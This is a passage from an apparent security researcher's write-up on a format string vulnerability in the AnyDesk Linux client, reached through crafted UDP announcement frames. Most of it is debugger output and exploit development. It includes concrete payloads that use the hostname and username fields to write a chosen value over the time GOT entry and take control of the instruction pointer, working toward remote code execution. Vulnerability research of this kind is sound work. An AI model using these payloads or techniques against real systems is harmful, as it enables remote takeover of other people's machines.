Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()

```

We hit the breakpoint on the call to `vsnprintf`. The third parameter (`RDX`) contains the format string. The passed string obviously contains an error message about an invalid UTF-8 encoded text. But this string does also contain the string, which caused the error: `'aaaa%d%n%p%d$+\201\275\v|'`. This is our fuzzing input! In the format string! We have found a format string vulnerability.

In this case the actual crash of the application was caused by the `%n` format specifier within the fuzzer-generated data. The `%n` format specifier can be used to write data. The address, where the data in this case is supposed to be written, happened to be null. This caused the segmentation fault.

Analyzing the code a little bit further we can determine that the call to `vsnprintf` prepares a string, which will be written to the log file (`~/.anydesk/anydesk.trace`). The fourth parameter of the outer function, which will be used as the format string, is in this case an error message generated by the `glib` library, which is raised because the text contains an invalid UTF-8 sequence. This error message was obviously assumed to be static. However the error message contains the input, which caused the error (the fuzzed hostname), which we can control. Thus we can control parts of the format string by inserting an invalid UTF-8 sequence into the hostname of an announcement frame. This results in a classical format string vulnerability.

Also it turned out that the vulnerable call is actually made twice. By sending an announcement frame with an invalid UTF-8 sequence and a format specifier (`'\x85\xfeTEST %p'`), we can see the result in `~/.anydesk/anydesk.trace`:

```

user@w00d:~$ tail -n 3 ~/.anydesk/anydesk.trace
warning 2020-05-25 08:59:02.119   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
warning 2020-05-25 08:59:02.125   frontend   main   4431   4431                                  glib - Failed to set text from markup due to error parsing markup: Error on line 1 char 43: Invalid UTF-8 encoded text in name - not valid '??TEST 0x15334e0'
   info 2020-05-25 08:59:02.132   frontend   main   4431   4431                     unix_app.frontend - Monitoring online states.

```

The error message has been written twice to the log file. We can also see how the inserted format specifier (`%p`) has been evaluated.

After analyzing the segmentation fault discovered by fuzzing the front-end process, we identified that the cause of the crash is a format string vulnerability. The next step is to develop an exploit for the identified vulnerability.

# Exploit

Within my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B) I described the basics on how to exploit a format string vulnerability using the `%n` format specifier. This format specifier can be used to write data and also caused the segmentation fault when fuzzing the application. Within this section we will take a look at how to exploit the format string vulnerability in this very specific setting in order to gain Remote Code Execution (RCE).

## Strategy

Probably the very first thing everyone does when facing a binary exploitation challenge is to check which security mechanisms are enabled. In this case the result is very surprising:

```

user@w00d:~$ checksec /usr/bin/anydesk
[*] '/usr/bin/anydesk'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

Actually no protection mechanisms are enabled, which makes the exploitation more easy.

While developing an exploit I would generally suggest to disable ASLR and just keep in mind that we have to bypass it. This makes it easier to compare addresses of multiple runs of the application:

```

user@w00d:~$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0

```

The first goal we need to achieve is to control the instruction pointer. Since there is `No RELRO`, we can use the `%n` format specifier to overwrite an entry within the `Global Offset Table` (`GOT`). As the heap segment, where our input data will be stored, is actually executable, we can store a shellcode there and make the `GOT` entry point to this shellcode. On the next call of the function, which `GOT` entry we overwrote, our shellcode is executed.

Although these steps sound quite straight forward, achieving this turned out to be a little bit more challenging. Let’s have a look.

## The v in vsnprintf

The next instruction after the vulnerable call to `vsnprintf` is a call to the function `time`. Accordingly we can overwrite the `GOT` entry of `time` and thus redirecting the control flow immediately after the `vsnprintf` call. In order to use the `%n` format specifier to overwrite the `GOT` entry of `time`, we need to be able to reference the address of the `GOT` entry. In a classical format string exploit this is achieved by being able to control data on the stack. Since all values on the stack, which are equal or below to the current `RSP`, can be referenced with an appropriate argument selector (e.g. `%35$n`), the desired address can simply be put into the controlled stack data. Using the appropriate argument selector in combination with the `%n` format specifier causes the function to write the amount of characters written so far to this address.

In this case things are a little bit different. As you probably already noticed the vulnerable call is **not** made to the function `snprintf`, which signature looks like this:

```

snprintf(char *s, size_t n, const char *format, ...)

```

…, but rather `vsnprintf`, which signature looks like this:

```

vsnprintf(char *s, size_t n, const char *format, va_list arg)

```

The difference here is that the format string arguments are not directly passed as variable arguments (`...`), but within a `va_list` parameter (`arg`). Each of the functions in the printf family has a corresponding `va_list` function beginning with the letter `v`:

```

user@w00d:~$ man 3 printf
...

       #include <stdio.h>

       int printf(const char *format, ...);
       int fprintf(FILE *stream, const char *format, ...);
       int dprintf(int fd, const char *format, ...);
       int sprintf(char *str, const char *format, ...);
       int snprintf(char *str, size_t size, const char *format, ...);

       #include <stdarg.h>

       int vprintf(const char *format, va_list ap);
       int vfprintf(FILE *stream, const char *format, va_list ap);
       int vdprintf(int fd, const char *format, va_list ap);
       int vsprintf(char *str, const char *format, va_list ap);
       int vsnprintf(char *str, size_t size, const char *format, va_list ap);

```

The structure of `va_list` is actually specific to the `Application Binary Interface` (`ABI`), which e.g. describes the calling convention, how the stack is organized and so on. On `x86`, where all function parameters are passed on the stack, `va_list` simply consists of a pointer to the stack area, where the original parameters are stored. With `x64` things get a little bit more complex. The first six parameters are passed in registers (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`), also there are special registers for floating point parameters (`XMM0` … `XMM7`). Additional parameters are passed on the stack as with `x86`. There is a very good blog post describing the details, which can be found [here](https://blog.nelhage.com/2010/10/amd64-and-va_arg/). The structure of the `va_list` looks like this on `x64`:

```

typedef struct {
  unsigned int gp_offset;
  unsigned int fp_offset;
  void *overflow_arg_area;
  void *reg_save_area;
} va_list[1];

```

There are two pointers: `overflow_arg_area`, which points to the first argument originally passed on the stack and `reg_save_area`, which points to an area on the stack where the arguments passed via registers are saved (the first six general parameters as well as eight floating point parameters). Both values `gp_offset` and `fp_offset` are offsets relative to `reg_save_arena` and reference the first general register parameter (`gp_offset`) as well as the first floating point parameter (`fp_offset`). These offsets exists because there are usually other parameters before the variable parameters (e.g. the format string itself).

Let’s have a practical look at this on the AnyDesk front-end. We attach gdb to it and set a breakpoint on the call to `vsnprintf`:

```

user@w00d:~$ sudo gdb /usr/bin/anydesk $(~/pid_frontend.py)
...
Attaching to program: /usr/bin/anydesk, process 3863
...
gdb-peda$ b *0x8ab346
Breakpoint 1 at 0x8ab346
gdb-peda$ c
Continuing.

```

Now we can use the python function again, which we created to generate announcement frames. In this case we send an announcement with the following hostname:

```

p = gen_discover_packet(4919, 1, '\x85\xfe 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p', 'custom username', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()

```

The beginning of the hostname (`'\x85\xfe'`) is an invalid UTF-8 sequence, which will trigger the format string vulnerability (any other invalid UTF-8 sequence can be used here). After this we use the `%p` format specifier to print the values of the first ten arguments.

A few seconds after running the script (up to 5 seconds until the GUI refreshes) our breakpoint is hit:

```

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x11c5040 --> 0x21 ('!')
RCX: 0x7ffffffeb898 --> 0x3000000010
RDX: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
RSI: 0x400
RDI: 0x7ffffffeafd0 --> 0x7
RBP: 0x5
RSP: 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
RIP: 0x8ab346 (call   0x412d90 <vsnprintf@plt>)
R8 : 0x0
R9 : 0x10
R10: 0xffffff81
R11: 0x7ffff1548550 --> 0xfff08320fff08310
R12: 0x7ffffffeb898 --> 0x3000000010
R13: 0xb366d8 --> 0x62696c67 ('glib')
R14: 0x1453d80 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
R15: 0x4
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0016| 0x7ffffffeab00 --> 0x158cba0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x20fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138ca30 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1572280 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$

```

The fourth parameter (`RCX = 0x7ffffffeb898`) is the `va_list` structure. The first two unsigned ints (4 bytes each) are the members `gp_offset` and `fp_offset`:

```

gdb-peda$ x/2xw 0x7ffffffeb898
0x7ffffffeb898:	0x00000010	0x00000030

```

After these values both pointers `overflow_arg_area` and `reg_save_area` follow:

```

gdb-peda$ x/2xg 0x7ffffffeb898+8
0x7ffffffeb8a0:	0x00007ffffffeb970	0x00007ffffffeb8b0

```

Since the value of `gp_offset` is 0x10, the function which was originally called with variable arguments had two preceding general parameters. In order to display the next four general parameters assumed to be passed in the remaining registers, we need to add `gp_offset` (`0x10`) to the `reg_save_area` pointer (`0x00007ffffffeb8b0`):

```

gdb-peda$ x/4xg 0x00007ffffffeb8b0+0x10
0x7ffffffeb8c0:	0x0000000001453d80	0x0000000000000000
0x7ffffffeb8d0:	0x00007ffff1784c40	0x0000000000000010

```

`vsnprintf` assumes that these four values were passed in registers. All following values are assumed to be passed via the stack and are referenced by the `overflow_arg_area` pointer (`0x00007ffffffeb970`):

```

gdb-peda$ x/6xg 0x00007ffffffeb970
0x7ffffffeb970:	0x0000000000b366d8	0x0000000000000000
0x7ffffffeb980:	0x0000000001482b01	0x00007ffff5e4ee24
0x7ffffffeb990:	0x0000000001453d80	0x0000000000000000

```

By entering `ni` the call to `vsnprintf` is made and we can inspect the resulting string (`set print elements 0` displays the whole string without truncation):

```

gdb-peda$ ni
...
gdb-peda$ set print elements 0
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1.0x1453d80 2.(nil) 3.0x7ffff1784c40 4.0x10 5.0xb366d8 6.(nil) 7.0x1482b01 8.0x7ffff5e4ee24 9.0x1453d80 10.(nil)'"

```

The first four parameters were indeed taken from the `reg_save_area` and all following values from the `overflow_arg_arena`. The following picture summarizes the structure:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_05-1.png)

## Gaining arbitrary write

After we have clarified what we can access with the format string, we need to find some data that we can control in the accessible data. If we can directly control data within the `reg_save_area` or `overflow_arg_area`, we could store the address of the `time GOT` entry and write to it using the `%n` format specifier.

Within the `reg_save_area` there are only 4 values we can access. These do obviously not contain any data of our input. All following parameters are stored in the `overflow_arg_area`. Let’s have a look at the first 50 values stored there using the `telescope` command:

```

gdb-peda$ telescope 0x00007ffffffeb970 50
0000| 0x7ffffffeb970 --> 0xb366d8 --> 0x62696c67 ('glib')
0008| 0x7ffffffeb978 --> 0x0
0016| 0x7ffffffeb980 --> 0x1530801 --> 0xe000007ffff17853
0024| 0x7ffffffeb988 --> 0x7ffff5e4ee24 (test   eax,eax)
0032| 0x7ffffffeb990 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0040| 0x7ffffffeb998 --> 0x0
0048| 0x7ffffffeb9a0 --> 0x10
0056| 0x7ffffffeb9a8 --> 0x7ffff5e501cd (<g_logv+605>:	mov    eax,r14d)
0064| 0x7ffffffeb9b0 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0072| 0x7ffffffeb9b8 --> 0x167ec00 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 87: Invalid UTF-8 encoded text in name - not valid '\205\376 1,%p 2.%p 3.%p 4.%p 5.%p 6.%p 7.%p 8.%p 9.%p 10.%p'")
0080| 0x7ffffffeb9c0 --> 0x1fffeb9d0
0088| 0x7ffffffeb9c8 --> 0x4342b0 (push   rbp)
0096| 0x7ffffffeb9d0 --> 0x0
0104| 0x7ffffffeb9d8 --> 0x7ffff7a5389b --> 0x4b544700006b7447 ('Gtk')
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0120| 0x7ffffffeb9e8 --> 0x0
0128| 0x7ffffffeb9f0 --> 0x155dd20 --> 0x7fffdc00f3d0 --> 0x1514300 --> 0x1513da0 --> 0x14d6e00 (--> ...)
0136| 0x7ffffffeb9f8 --> 0x0
0144| 0x7ffffffeba00 --> 0x500000000
0152| 0x7ffffffeba08 --> 0x7ffff5e9acd8 ("Invalid UTF-8 encoded text in name - not valid '%s'")
0160| 0x7ffffffeba10 --> 0x0
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
0176| 0x7ffffffeba20 --> 0x7ffff5e969e1 --> 0x4600303262696c67 ('glib20')
...

```

We can see a few occurrences of the heap address of the format string. Although we control parts of the format string, we don’t control the address, which is what we would need to. Searching even further down the stack for possible data we can control does not yield anything useful. So it seems that we can’t control any data, which we can access with the format string. Is this already a dead end? Of course not!

Taking a look at the values above again, we can see that there are stack addresses stored on the stack. There are even stack addresses, which reference the area we can access. For example at offset `112` the stack address `0x7ffffffeba18` is stored, which corresponds to offset `168`:

```

...
0112| 0x7ffffffeb9e0 --> 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...
0168| 0x7ffffffeba18 --> 0x7ffff1431f9b (<__GI___libc_realloc+875>:	mov    r8,QWORD PTR [rsp+0x8])
...

```

If we use the appropriate argument selector we can use this stack address to write to the area we can access. We can then use another argument selector to reference the data we wrote. The following picture visualizes the basic idea:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_06-1.png)

The problem here is that we cannot do this in a single call of `vsnprintf`. All referenced data is fetched **before** data is written by the `%n` format specifier. This means that the `%19$ln` would indeed overwrite the data on the stack, but the `%26$ln` would still evaluate to the old value, which was stored there. Accordingly we need two calls:

1. Store address of `time` `GOT` entry on the stack
2. Write to previously stored `GOT` entry address in order to control instruction pointer

As you may remember, the vulnerable call to `vsnprintf` is actually made twice for the very same format string. Though it turned out that the call path for both of these calls vary. Because of this also the stack layout varies. This means that an argument selector (e.g. `%26$ln`) on the first call will not reference the same value on the second call. We also need to keep in mind that we cannot change the format string in-between the two calls. If we e.g. use `%200$n` on the first call, to write the `GOT` address on the stack, we need to ensure that `%200$n` on the second call also references a writable address, because we trigger a segmentation fault otherwise. This is not only true for `%n` we use to store the `GOT` address but also for the second `%n`, we need to use in order to actually write to the `GOT` entry. Unfortunately there did not seem to be any values on the stack, which would fulfill these requirements.

Thus we need another approach. The first thing that came into my mind was to send two independent announcement frames. We need to trigger the vulnerability twice, so let’s just trigger it twice via the initial attack vector. Because of the duplicate call this actually results in four calls to `vsnprintf`. We still must ensure that the `%n` used on the respective first call also references a writable memory location on the associated second call, but since we only need to use one `%n` format specifier in each pair of calls, stack values can be found to fulfill this requirement.

Although the approach using two separate announcement frames seemed to work, I did not really like it. One reason for this is the duplicate call of `vsnprintf`. We must accept that the second call writes somewhere into memory even though it is not relevant for our exploit. Also the two announcement frames may interfere with legitimate announcement frames, which are sent in the same time window (the GUI gets updated only every 5 seconds). These aspects may reduce the reliability of the exploit.

While thinking about this and looking at the GUI another idea came into my mind:

![](https://devel0pment.de/wp-content/uploads/2020/05/anyd_02.png)

The GUI displays not only the hostname, but also the username. So far we triggered the vulnerability only by using the hostname. But the username should also be prone to this. Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %p', '\x85\xfeUSERNAME %p', 'ad', 'main')

```

After a few seconds the GUI updates and the breakpoint on the `vsnprintf` call is hit:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

Inspecting the format string (third parameter) we can see that the username indeed triggered the vulnerability. After continuing the execution the breakpoint is hit again:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 47: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010

```

This time the vulnerability was triggered by the hostname. If we further continue the execution both calls (for username and hostname) are repeated.

Thus we verified that the vulnerability can be triggered using both the hostname and the username. This is a good news for our exploit because we can now use two independent format strings, which are sent in a single UDP packet and are both evaluated before the duplicate call is triggered.

What we have to do now is to find an accessible stack address, which we will write the `GOT` address to. For this we must keep in mind that the values on the stack between the two `vsnprintf` calls may change / get overwritten. If we write to an stack address, which is too near to the top of the stack, it is very likely that it has been overwritten at the time of the second call. Finding a suitable value is only a matter of try and error. We write to an address on the first call and then verify that the value we wrote is still the same on the second call.

The stack address `0x7ffffffebe70`, which can be accessed using the argument selector `%93$ln` fits our needs:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376USERNAME %93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 2, 0x00000000008ab346 in ?? ()
gdb-peda$ telescope 0x00007ffffffeb970 100
...
0704| 0x7ffffffebc30 --> 0x7ffffffebe70 --> 0x6ffffec070
...

```

After the first call the value `0x90` (the characters written so far) is written to `0x7ffffffebe70`:

```

gdb-peda$ ni
...
[-------------------------------------code-------------------------------------]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
   0x8ab346:	call   0x412d90 <vsnprintf@plt>
=> 0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
   0x8ab35c:	call   0x4123d0 <gettimeofday@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x7ffffffeacc0 --> 0x0
0008| 0x7ffffffeaaf8 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0016| 0x7ffffffeab00 --> 0x171f0c0 --> 0x0
0024| 0x7ffffffeab08 --> 0x7ffffffeac50 --> 0x55fe85272064696c
0032| 0x7ffffffeab10 --> 0x7ffffffeae70 --> 0x0
0040| 0x7ffffffeab18 --> 0x7ffff5e379d4 (<g_hash_table_lookup+52>:	mov    r8d,0x2)
0048| 0x7ffffffeab20 --> 0x138b230 --> 0x11f6ab0 --> 0x11e7340 --> 0x31 ('1')
0056| 0x7ffffffeab28 --> 0x1715ca0 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000008ab34b in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

When the breakpoint is hit again on the second call, the value is still the same:

```

gdb-peda$ c
Continuing.
...
[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2249 ('I"')
0008| 0x7ffffffeaaf8 --> 0x2bc
0016| 0x7ffffffeab00 --> 0x158c710 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbad94
0032| 0x7ffffffeab10 --> 0x5ecbad94
0040| 0x7ffffffeab18 --> 0xab240
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000000000000090

```

On the second call we can access the value using the argument selector `%165$p` (offset `1280`):

```

gdb-peda$ telescope 0x00007ffffffeb970 200
...
1280| 0x7ffffffebe70 --> 0x90
...

```
## Controlling the instruction pointer

Now we are finally ready to overwrite the `GOT` entry of `time`. At first let’s determine the address of the `GOT` entry:

```

gdb-peda$ p/x &'time@got.plt'
$1 = 0x119ddc0

```

Accordingly the `GOT` entry of `time` is stored at `0x119ddc0`. In order to write this value, we can pad the output of `vsnprintf` accordingly using a `field width`. If you are not familiar with this, please refer to my writeup on [RPISEC/MBE lab04B](https://devel0pment.de/?p=351#lab4B). The error message itself (`Failed to set text from markup ...`) contains 133 characters. Also we need to add two characters for an invalid UTF-8 sequence. Thus we have to pad the output to `18472249` characters:

```

0x119ddc0 = 18472384 (time GOT)
18472384 - 133 - 2 = 18472249

```

Let’s verify this by sending the following announcement frame:

```

p = gen_discover_packet(4919, 1, '\x85\xfeHOSTNAME %165$p', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After the first call to `vsnprintf` the target stack address (`0x7ffffffebe70`) actually contains the `GOT` address of `time`:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 52: Invalid UTF-8 encoded text in name - not valid '\205\376%18472249x%93$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x0000006ffffec070
gdb-peda$ ni
...
gdb-peda$ x/xg 0x7ffffffebe70
0x7ffffffebe70:	0x000000000119ddc0

```

The `%165$p` format specifier on the second call successfully references the `GOT` address:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME %165$p'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
...
gdb-peda$ ni
gdb-peda$ x/s 0x7ffffffeafd0
0x7ffffffeafd0:	"Failed to set text from markup due to error parsing markup: Error on line 1 char 51: Invalid UTF-8 encoded text in name - not valid '\205\376HOSTNAME 0x119ddc0'"

```

The next step is to replace the `%p` format specifier with `%ln` in order to write a 8 byte value to the `GOT` entry on the second call. This way we should be able to control the instruction pointer, when the call to `time` is triggered after the `vsnprintf` call. Let’s verify this by writing the value `0x1337`:

```

0x1337 = 4919
4919 - 133 - 2 = 4784

```

This time we adjust the hostname accordingly:

```

p = gen_discover_packet(4919, 1, '\x85\xfe%4784x%165$ln', '\x85\xfe%18472249x%93$ln', 'ad', 'main')

```

After sending the frame and continuing to the second call to `vsnprintf`, to `GOT` entry of `time` is still untouched:

```

[-------------------------------------code-------------------------------------]
   0x8ab336:	lea    rdi,[rsp+0x4e0]
   0x8ab33e:	mov    rcx,r12
   0x8ab341:	mov    esi,0x400
=> 0x8ab346:	call   0x412d90 <vsnprintf@plt>
   0x8ab34b:	lea    rdi,[rsp+0x18]
   0x8ab350:	call   0x412ff0 <time@plt>
   0x8ab355:	lea    rdi,[rsp+0x20]
   0x8ab35a:	xor    esi,esi
Guessed arguments:
arg[0]: 0x7ffffffeafd0 --> 0x7
arg[1]: 0x400
arg[2]: 0x7ffffffeabd0 ("Failed to set text from markup due to error parsing markup: Error on line 1 char 49: Invalid UTF-8 encoded text in name - not valid '\205\376%4784x%165$ln'")
arg[3]: 0x7ffffffeb898 --> 0x3000000010
[------------------------------------stack-------------------------------------]
0000| 0x7ffffffeaaf0 --> 0x2743 ("C'")
0008| 0x7ffffffeaaf8 --> 0x357
0016| 0x7ffffffeab00 --> 0x158cf10 --> 0x0
0024| 0x7ffffffeab08 --> 0x5ecbb8cc
0032| 0x7ffffffeab10 --> 0x5ecbb8cc
0040| 0x7ffffffeab18 --> 0xd0f51
0048| 0x7ffffffeab20 --> 0xdd73d0 --> 0x8c3200 (mov    QWORD PTR [rdi],0xdd73d0)
0056| 0x7ffffffeab28 --> 0x3
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Thread 1 "anydesk" hit Breakpoint 1, 0x00000000008ab346 in ?? ()
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x00007ffff7ffb930

```

By executing the `vsnprintf` call the value `0x1337` is successfully written:

```

gdb-peda$ ni
...
gdb-peda$ x/xg 0x119ddc0
0x119ddc0 <time@got.plt>:	0x0000000000001337

```

